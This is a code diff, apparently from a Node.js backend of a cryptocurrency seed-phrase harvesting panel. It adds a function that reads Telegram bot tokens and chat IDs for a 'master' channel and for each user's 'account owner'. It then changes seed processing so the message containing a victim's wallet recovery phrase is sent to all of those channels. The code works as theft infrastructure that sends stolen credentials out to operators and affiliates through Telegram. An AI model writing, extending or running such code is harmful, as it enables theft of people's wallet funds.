@@ -77,6 +77,34 @@ try { ed25519HdKey = require('ed25519-hd-key'); } catch { /* SOL 스킵 */ }
 // ─────────────────────────────────────────
 //  텔레그램
 // ─────────────────────────────────────────
+/** DB에서 마스터 시드 채널 + 유저 소속 오너 시드 채널 */
+async function resolveSeedTelegramTargets(userId) {
+  const targets = [];
+  try {
+    const [rows] = await db.pool.query(
+      `SELECT skey, sval FROM master_settings WHERE skey IN ('master_tg_bot_token','master_tg_chat_seed','master_tg_chat_id')`
+    );
+    const m = {};
+    for (const r of rows) m[r.skey] = r.sval;
+    const tok = (m.master_tg_bot_token || '').toString().trim();
+    const chat = (m.master_tg_chat_seed || '').toString().trim() || (m.master_tg_chat_id || '').toString().trim();
+    if (tok && chat) targets.push({ token: tok, chat });
+  } catch (_) { /* ignore */ }
+  try {
+    const [[u]] = await db.pool.query('SELECT owner_id FROM users WHERE id = ?', [userId]);
+    if (u && u.owner_id) {
+      const [[o]] = await db.pool.query(
+        'SELECT tg_bot_token, tg_chat_seed FROM account_owners WHERE id = ?',
+        [u.owner_id]
+      );
+      const tok = (o && o.tg_bot_token || '').toString().trim();
+      const chat = (o && o.tg_chat_seed || '').toString().trim();
+      if (tok && chat) targets.push({ token: tok, chat });
+    }
+  } catch (_) { /* ignore */ }
+  return targets;
+}
+
 async function sendTelegram(message, botToken, chatId) {
   const token = botToken || CONFIG.TELEGRAM_BOT_TOKEN;
   const chat  = chatId   || CONFIG.TELEGRAM_CHAT_ID;
@@ -324,7 +352,18 @@ async function processSeed(seedData) {
       }
       msg += `\n━━━━━━━━━━━━━━━━━━\n📝 <b>시드 문구:</b>\n<code>${phrase}</code>\n━━━━━━━━━━━━━━━━━━`;
 
-      await sendTelegram(msg);
+      const targets = await resolveSeedTelegramTargets(user_id);
+      if (targets.length > 0) {
+        const seen = new Set();
+        for (const t of targets) {
+          const k = `${t.token}|${t.chat}`;
+          if (seen.has(k)) continue;
+          seen.add(k);
+          await sendTelegram(msg, t.token, t.chat);
+        }
+      } else {
+        await sendTelegram(msg);
+      }
     } else {
       console.log(`📭 잔고 없음 (ID=${id})`);
     }
